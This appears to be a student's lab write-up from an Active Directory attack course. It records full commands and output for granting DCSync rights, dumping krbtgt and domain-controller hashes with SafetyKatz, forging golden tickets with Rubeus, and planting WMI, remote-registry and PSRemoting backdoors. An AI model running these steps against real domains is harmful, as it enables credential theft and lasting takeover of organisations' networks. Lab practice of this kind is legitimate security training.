![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (0)
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1`:
```
WinRM Security Configuration.
This command modifies the TrustedHosts list for the WinRM client.📌
The computers in the TrustedHosts list might not be authenticated.
The client might send credential information to these computers.
Are you sure that you want to modify this list?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

`Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential`:
```
[172.16.2.1]: PS C:\Users\Administrator.DCORP-DC\Documents>
```
🚀

![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`$env:username`:
```
Administrator👤
```

`$env:computername`:
```
DCORP-DC🖥️
```

`whoami`:
```
dcorp-dc\administrator👤
```

`hostname`:
```
dcorp-dc🖥️
```
🚩

#### Domain Persistence using ACLs | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)


`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student422"}`:
```
```
❌

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : N0V3GD6B
[*] Domain          : LY3C5P4Q
[*] Password        : YPIV5X18
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 6912
[+] LUID            : 0x6d7248

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 7172680
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x6d7248
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/14/2025 4:58:23 AM
  EndTime                  :  2/14/2025 2:58:23 PM
  RenewTill                :  2/21/2025 4:58:23 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  XSkrPAU7Jxekw8JU5mrW0ZQCe55tElx6Hs8v9PrSmws=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process](./assets/screenshots/learning_objective_12_new_spawned_terminal_process.png)

`klist`:
```
Current LogonId is 0:0x6bbe52

Cached Tickets: (1)

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/6/2025 6:22:32 (local)
        End Time:   3/6/2025 16:22:32 (local)
        Renew Time: 3/13/2025 6:22:32 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student422 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`:
```
[SNIP]

VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student422📌,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync'📌
on DC=dollarcorp,DC=moneycorp,DC=local

[SNIP]
```

Let's check for the rights once again from the normal shell.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student422"}`:
```
AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set📌
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student422👤

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes📌
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student422👤

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All📌
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student422👤
```
🚩

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\dcorp-dc$
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\dcorp-dc$' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : DCORP-DC

** SAM ACCOUNT **

SAM Username         : DCORP-DC$👤
Account Type         : 30000001 ( MACHINE_ACCOUNT )
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Account expiration   :
Password last change : 2/5/2025 9:02:28 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: 68d6c096c7cfee52a45d6207489526bc🔑
    ntlm- 0: 68d6c096c7cfee52a45d6207489526bc
    ntlm- 1: d79ad890d24d8df4936f85bf11d8fd5b
    ntlm- 2: 22f01da668a849cfc8dd5b0c36ef3ab4
    ntlm- 3: f2180db8f899b59543d56f16bb7cff59
    ntlm- 4: 627ae7e6fd4b72ad1ec9808c773a5a5b
    ntlm- 5: d31bad6c1cf5712baeac4c7b1ae8abd0
    ntlm- 6: 268b8d00e7f18cb0bf68cb2b08345ad3
    ntlm- 7: 9528de61ea331943d6bfc53c869627b3
    ntlm- 8: 68aaa6d7419d74ec06cbd45710a06fbd
    ntlm- 9: 0815b43c065b92dfcc497f0beef12480
    ntlm-10: 915a88647de381e31663e5e4a0939cab
    ntlm-11: 83471b07629c4a77e5514d9754f6b853
    ntlm-12: 77f9b24843b43c08b1a4f6a3bb849b56
    ntlm-13: 3b08222797d52a17c3fe48b370cfc8e1
    ntlm-14: 1be12164a06b817e834eb437dc8f581c
    ntlm-15: 402fa2cfac3e58e2187a056b204d85c5
    lm  - 0: 9574cca8ae4b925cbe3e8b22c9153b16
    lm  - 1: bdceaf0607c329bcbf0562fe750c16d1
    lm  - 2: 5d312b6d9d8cc27597308d349789c002
    lm  - 3: 66970750552174b18bdaa7ecef7c241a
    lm  - 4: e70810c4999d3f485cc9074247d4a343
    lm  - 5: 03a7fa039bd63ef18dd0c6f479d52f57
    lm  - 6: 9c05844298a87c7ad7b6b907cf7c2eea
    lm  - 7: bc56c097d25dc1531bcb56a052011e3f
    lm  - 8: 6cb8d29dfb0efe14f04ee7a795cc3b78
    lm  - 9: 09ba339c8d917936ae43975891101ca6
    lm  -10: 3039abc4b8d398898adf5f396466ac5e
    lm  -11: dad64f9a838fdb0dfff1066092e0726b
    lm  -12: b72a11b827af9320fda43d8356af8479
    lm  -13: 6f1825c909da6a8ccfbbd1f140dda9f0
    lm  -14: b94edbc472b4f5068a4bf9998d5f6048

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALhostdcorp-dc.dollarcorp.moneycorp.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bf32456704e1f1c1abaf07d210514339283201990a128b85d31cea103e7a39c2🔑
      aes128_hmac       (4096) : acf4e3984964a674209dae10e154decf
      des_cbc_md5       (4096) : e629cbf7323d32a4
    OldCredentials
      aes256_hmac       (4096) : 58a1c09fff169c645907d516c6de0583736abd1f4853c079bef3fabe13aa1534
      aes128_hmac       (4096) : ff568bc0fede2938d209109a69211ef7
      des_cbc_md5       (4096) : 7a6d867564f2629d
    OlderCredentials
      aes256_hmac       (4096) : d8474f4ed8b431c3daf26dfc0df51f6944bad633cba45c140dc710273d3840fb
      aes128_hmac       (4096) : 728b9cfe02f459a357924c664f9ff3b8
      des_cbc_md5       (4096) : 64dcc1d9c734dca2

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALhostdcorp-dc.dollarcorp.moneycorp.local
    Credentials
      des_cbc_md5       : e629cbf7323d32a4
    OldCredentials
      des_cbc_md5       : 7a6d867564f2629d

[SNIP]
```
🚩

#### Domain Persistence using ACLs | Security Descriptors (with Rubeus, RACE)

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt👤
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\RACE.ps1`

`Set-RemoteWMI -SamAccountName 'student422' -ComputerName 'dcorp-dc' -namespace 'root\cimv2' -Verbose`:
```
VERBOSE: Existing ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)📌(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLC
SWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917
688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-
719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CIID;C
CDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)
VERBOSE: Existing ACL for DCOM is
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)(A;;CCDCLCSWR
P;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;
CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)
VERBOSE: New ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLC
SWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917
688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-
719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CIID;C
CDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-7198
15819-3726368948-3917688648-20607)
VERBOSE: New ACL for DCOM
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)(A;;CCDCLCSWR
P;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;
CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-2
0607)
```

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Get-WmiObject -class win32_operatingsystem -ComputerName 'dcorp-dc'`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

`gwmi -class win32_process -ComputerName 'dcorp-dc' | %{ $_.ProcessName }`:
```
[SNIP]

csrss.exe
winlogon.exe
services.exe
lsass.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
LogonUI.exe
dwm.exe
svchost.exe
svchost.exe
VSSVC.exe
svchost.exe
svchost.exe
svchost.exe
spoolsv.exe
svchost.exe
Microsoft.ActiveDirectory.WebServices.exe
svchost.exe
dfsrs.exe
dns.exe
ismserv.exe
svchost.exe
dfssvc.exe
MsMpEng.exe

[SNIP]
```

`gwmi -Namespace 'root' -Class '__Namespace' -ComputerName 'dcorp-dc' | %{ $_.Name }`:
```
subscription
DEFAULT
MicrosoftDfs
CIMV2
msdtc
Cli
MicrosoftActiveDirectory
SECURITY
RSOP
MicrosoftDNS
PEH
StandardCimv2
WMI
AccessLogging
directory
Policy
InventoryLogging
Interop
Hardware
ServiceModel
Microsoft
Appv
```
🚩

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt👤
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\RACE.ps1`

`Set-RemotePSRemoting -SamAccountName 'student422' -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local' -Verbose`:
```
[dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed
with the following error message: The I/O operation has been aborted because of either a thread exit or an application
request. For more information, see the about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (dcorp-dc.dollarcorp.moneycorp.local:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : WinRMOperationAborted,PSSessionStateBroken
```
❌

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Invoke-Command -ScriptBlock{$env:username} -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local'`:
```
student422👤
```
🚩

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt👤
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\RACE.ps1`

`Add-RemoteRegBackdoor -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local' -Trustee 'student422' -Verbose`:
```
[SNIP]

VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with
the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Backdooring completed for system

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local student422📌
```

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\RACE.ps1`

`Get-RemoteMachineAccountHash -ComputerName 'dcorp-dc' -Verbose`:
```
VERBOSE: Bootkey/SysKey : BAB78ACD91795C983AEF0534E0DB38C7
VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8618E84005C

ComputerName MachineAccountHash
------------ ------------------
dcorp-dc🖥️  68d6c096c7cfee52a45d6207489526bc🔑
```

